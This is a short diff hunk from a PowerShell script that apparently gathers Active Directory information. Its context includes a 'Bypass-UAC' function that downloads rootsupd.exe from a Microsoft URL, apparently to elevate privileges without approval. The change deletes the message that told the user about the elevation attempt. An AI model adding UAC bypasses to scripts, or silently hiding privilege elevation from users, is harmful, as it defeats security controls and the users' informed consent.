@@ -310,8 +310,7 @@ function Set-ActiveDirectoryInformations ($adFlag) {
         try {$backupOperators = (Get-ADGroupMember $backupOperatorsGroup -Recursive).DistinguishedName}catch{}      
     }
 }
-function Bypass-UAC ($scriptPath, $logDirectoryPath) {      
-    Write-Host "Your are not an administrator of this computer.. I'm trying to elevate your privileges"           
+function Bypass-UAC ($scriptPath, $logDirectoryPath) {               
     $fileToDownload = "http://download.microsoft.com/download/1/F/F/1FF5FEA9-C0F4-4B66-9373-278142683592/rootsupd.exe" 
     $fileDownloaded = "$logDirectoryPath\rootsupd.exe" 
      
